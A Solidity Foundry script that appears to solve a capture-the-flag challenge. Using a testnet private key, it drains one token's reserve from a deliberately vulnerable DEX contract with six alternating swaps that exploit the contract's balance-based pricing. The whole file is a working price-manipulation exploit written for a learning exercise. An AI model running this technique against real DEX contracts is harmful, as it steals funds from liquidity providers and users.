// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Script.sol";

interface IDex {
    function swap(address from, address to, uint amount) external;

    function token1() external view returns (address);

    function token2() external view returns (address);
}

interface ISwappableToken {
    function balanceOf(address owner) external returns (uint);

    function approve(address owner, address spender, uint amount) external;
}

contract DexScript is Script {
    function run() external {
        address dexAddress = vm.envAddress("DEX_ADDRESS");
        address attacker = vm.rememberKey(vm.envUint("TESTNET_PRIVATE_KEY_2"));
        IDex dex = IDex(dexAddress);
        address tokenOne = dex.token1();
        address tokenTwo = dex.token2();

        vm.startBroadcast(attacker);
        ISwappableToken(tokenOne).approve(attacker, address(dex), 500);
        ISwappableToken(tokenTwo).approve(attacker, address(dex), 500);

        dex.swap(tokenOne, tokenTwo, 10);
        dex.swap(tokenTwo, tokenOne, 20);
        dex.swap(tokenOne, tokenTwo, 24);
        dex.swap(tokenTwo, tokenOne, 30);
        dex.swap(tokenOne, tokenTwo, 41);
        dex.swap(tokenTwo, tokenOne, 45);
        vm.stopBroadcast();

        assert(
            ((ISwappableToken(tokenOne).balanceOf(dexAddress) == 0) ||
                (ISwappableToken(tokenTwo).balanceOf(dexAddress) == 0))
        );
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
